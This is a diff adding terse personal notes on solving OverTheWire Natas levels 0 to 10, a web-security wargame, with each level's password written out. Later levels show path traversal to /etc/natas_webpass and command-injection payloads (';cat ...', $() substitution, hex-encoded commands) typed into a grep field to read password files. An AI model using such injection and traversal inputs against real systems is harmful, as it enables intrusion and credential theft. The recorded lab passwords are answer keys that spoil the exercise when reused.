@@ -1,0 +1,81 @@
+Natas 0:
+Login and ctrl-shift-i
+Its in a comment
+gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+Natas 1:
+Login and ctrlshift-i
+Same thing, just disabled right mouse
+ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+Natas 2:
+Found /files/users.txt
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+Natas 3:
+“Not even google will find it”...think for a second...robots.txt
+Disallow /s3cr3t
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+Natas 4:
+The only way i know how to do this is to use burp to change my origin…
+This is correct, I at school so I cant open a kali vm rn
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+Natas 5:
+Edit my cookie gc extension
+Change logged in from 0 (false) to 1 (true)
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+Natas 6:
+Went to source code
+Found reference to includes/secret.inc
+Went to includes/secret.inc
+Found password
+Entered password into password prompt
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+Natas 7:
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 →
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+Natas 8:
+From source code: return bin2hex(strrev(base64_encode($secret)))
+hexadecimal(reversed(base64(string)))
+To reverse: revhex(reverse(revbase64(string)))
+3d3d516343746d4d6d6c315669563362 	- encoded
+==QcCtmMml1ViV3b				- base 64 reversed
+b3ViV1lmMmtCcQ==				- base 64
+oubWYf2kBq					- password
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl	- natas 9 password
+
+Natas 9:
+Given source code, can also enter “*” into prompt to dump source
+“$” dumps everything in dictionary
+Nothing useful
+Grep -i “needle dictionary.txt; ls -la; ls”  
+Use “;” to escape the grep command
+;cat ../../../../etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Natas 10:
+Blacklisted Characters:
+“;”, “&”, “|”, “/” 
+$(touch /tmp/test)
+$(echo a > /tmp/test)
+$(cat /tmp/test)
+This works, searches dict for words with an “a”
+$(echo “3b636174202e2e2f2e2e2f2e2e2f2e2e2f6574632f6e617461735f776562706173732f6e617461733131” > /tmp/test)
+$(xxd -r -p /tmp/test)
+;cat ../../../../etc/natas_webpass/natas11
+Did not work
+Read --help
+Example: grep -i 'hello world' menu.h main.c
+Can grep multiple files at a time
+Grep -i ‘u’ /etc/natas_webpass/natas11 dictionary.txt
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+Natas 11:
+
+
